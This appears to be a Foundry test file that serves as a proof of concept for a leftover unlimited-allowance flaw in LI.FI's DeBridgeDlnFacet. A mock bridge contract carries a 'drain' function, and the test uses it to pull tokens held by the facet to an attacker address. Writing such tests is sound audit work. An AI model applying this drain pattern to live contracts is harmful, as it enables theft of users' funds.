// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {DeBridgeDlnFacet} from "lifi/Facets/DeBridgeDlnFacet.sol";
import {IDlnSource} from "lifi/Interfaces/IDlnSource.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockDLNSource is IDlnSource {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function globalFixedNativeFee() external pure returns (uint256) {
        return 0;
    }

    function createOrder(
        OrderCreation calldata _orderCreation,
        bytes calldata,
        uint32,
        bytes calldata
    ) external payable returns (bytes32 orderId) {
        MockERC20(token).transferFrom(
            msg.sender,
            address(this),
            _orderCreation.giveAmount
        );
        return bytes32("order");
    }

    // malicious drain function exploiting leftover allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract DeBridgeDlnFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockDLNSource internal bridge;
    DeBridgeDlnFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockDLNSource(address(token));
        facet = new DeBridgeDlnFacet(IDlnSource(address(bridge)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);

        // map destination chain id to deBridge chain id to avoid reverts
        bytes32 ns = keccak256("com.lifi.facets.debridgedln");
        bytes32 slot = keccak256(abi.encode(uint256(1), ns));
        vm.store(address(facet), slot, bytes32(uint256(1)));
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 1,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        DeBridgeDlnFacet.DeBridgeDlnData memory dlnData = DeBridgeDlnFacet.DeBridgeDlnData({
            receivingAssetId: abi.encodePacked(address(token)),
            receiver: abi.encodePacked(address(0x1234)),
            orderAuthorityDst: bytes(""),
            minAmountOut: 10 ether
        });

        facet.startBridgeTokensViaDeBridgeDln{value:0}(bridgeData, dlnData);

        // allowance remains set after bridging
        assertEq(
            token.allowance(address(facet), address(bridge)),
            type(uint256).max
        );

        // attacker sends tokens to facet and bridge drains them
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

